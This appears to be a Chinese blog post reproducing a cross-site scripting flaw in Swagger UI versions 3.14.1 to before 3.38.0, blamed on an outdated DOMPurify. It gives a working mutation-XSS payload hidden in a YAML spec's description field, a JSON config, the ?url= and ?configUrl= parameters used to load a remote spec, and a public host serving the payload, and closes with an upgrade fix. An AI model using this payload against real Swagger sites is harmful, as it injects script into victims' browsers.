# swagger xss漏洞复现
@[toc]

## 漏洞介绍
 Swagger UI 有一个有趣的功能，允许您提供 API 规范的 URL - 一个 yaml 或 json 文件，将被获取并显示给用户
 根本原因非常简单 - 一个过时的库DomPurify

## 影响版本
XSS 影响的 Swagger UI 版本：>=3.14.1 < 3.38.0


## 实现原理
利用允许提供json文件的原理访问公网网站进行弹窗
json网站:https://jumpy-floor.surge.sh/test.yaml
拼接方式
?url=https://your_api_spec/spec.yaml
?configUrl=https://your_api_spec/file.json

yaml配置文件
```yaml
swagger: '2.0'
info:
  title: Example yaml.spec
  description: |
    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' οnerrοr='alert(document.head)'>">
paths:
  /accounts:
    get:
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      operationId: findAccounts
      summary: Finds all accounts
```
json文件配置
```json
{
    "url": "http://IP/test.yaml",
    "urls": [
        {
            "url": "http://IP/test.yaml",
            "name": "Foo"
        }
    ]
}
```
## 漏洞复现
随机找一位受害者访问
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/522bd38da7274489bc1485612e4256b8.png)
进行拼接?url=https://jumpy-floor.surge.sh/test.yaml
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/ae3d16279d4544f0b9b313f4c6063c11.png)
弹窗

## 修复建议:
升级到最新
